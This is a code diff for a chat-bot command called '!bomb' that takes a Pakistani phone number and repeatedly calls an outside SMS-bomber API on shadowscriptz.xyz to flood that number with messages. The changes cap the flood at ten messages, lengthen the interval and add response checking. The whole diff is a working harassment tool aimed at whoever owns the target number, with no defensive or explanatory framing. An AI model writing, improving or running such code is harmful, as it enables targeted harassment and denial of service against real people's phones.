@@ -18,32 +18,34 @@ cmd({
         return reply("✅ Bombing stopped!");
     }
 
-    // START Logic
-    const args = text.split(' ');
-    const number = args[1]?.replace(/[^0-9]/g, '');
-    if (!number || !number.startsWith('92')) {
-        return reply("❌ Invalid PK number! Usage: !bomb 923001234567 [count=10]");
+    // Extract & Validate Number
+    const number = text.split(' ')[1]?.replace(/[^0-9]/g, '');
+    if (!number || !number.startsWith('92') || number.length < 11) {
+        return reply("❌ Invalid PK number! Usage: !bomb 923001234567");
     }
 
-    const count = parseInt(args[2]) || 10; // Default 10 SMS
+    // Start Bombing
     isBombing = true;
     let sent = 0;
-
-    reply(`💣 *Bombing Started!*\nNumber: ${number}\nCount: ${count}`);
+    reply(`💣 *Bombing Started!*\nTarget: ${number}`);
 
     bombingInterval = setInterval(async () => {
-        if (!isBombing || sent >= count) {
+        if (!isBombing || sent >= 10) { // Max 10 SMS
             clearInterval(bombingInterval);
             isBombing = false;
-            reply(`✅ Sent ${sent}/${count} SMS!`);
+            reply(`✅ Sent ${sent} SMS!`);
             return;
         }
 
         try {
             const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
             const response = await fetch(apiUrl);
-            
-            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            const result = await response.text();
+            console.log("API Response:", result); // Debugging
+
+            if (!result.includes("Success")) {
+                throw new Error("API ne Success nahi bheja!");
+            }
             sent++;
             
         } catch (err) {
@@ -52,5 +54,5 @@ cmd({
             isBombing = false;
             reply(`❌ Failed: ${err.message}`);
         }
-    }, 3000); // 3-second delay
+    }, 5000); // 5-second delay
 });
